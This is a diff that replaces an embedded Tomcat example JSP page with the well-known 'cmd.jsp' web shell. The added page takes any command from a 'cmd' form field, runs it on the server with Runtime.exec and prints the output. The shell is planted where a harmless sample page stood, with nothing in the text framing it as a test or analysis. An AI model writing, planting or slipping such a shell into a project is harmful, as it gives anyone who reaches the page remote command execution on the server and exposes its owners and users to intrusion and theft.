@@ -1,18 +1,33 @@
-<html>
-<head>
-    <title>Embedded Tomcat example (JSP)</title>
-    <link rel="stylesheet" href="/css/reset.css">
-</head>
-<body>
-    <h1>Embedded Tomcat example: JSP</h1>
-
-    <p>
-        <img src="img/MS-Azure_logo_stacked_c-gray_rgb.png" width="340" height="180">
-    </p>
-
-    <p>Current time: <%= new java.util.Date() %></p>
-    <hr>
-    <a href="/servlet">Servlet example</a>
-</body>
-
-</html>
+<%@ page import="java.util.*,java.io.*"%>
+<%
+//
+// JSP_KIT
+//
+// cmd.jsp = Command Execution (unix)
+//
+// by: Unknown
+// modified: 27/06/2003
+//
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
